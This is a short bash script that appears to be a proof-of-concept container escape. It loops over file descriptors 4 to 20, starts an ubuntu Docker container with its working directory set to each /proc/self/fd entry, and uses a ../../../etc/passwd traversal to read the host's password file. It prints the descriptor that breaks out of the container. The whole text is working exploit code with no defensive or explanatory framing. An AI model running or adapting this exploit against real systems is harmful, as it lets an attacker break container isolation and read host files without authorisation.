#!/bin/bash

for i in {4..20}; do
    output=$(docker run -it --rm -w /proc/self/fd/$i ubuntu:latest bash -c "cat /proc/self/cwd/../../../etc/passwd" 2>/dev/null)
    if echo "$output" | grep -q "root:x:0:0"; then
        echo "Exploit fd: /proc/self/fd/$i"
		break
    fi
done
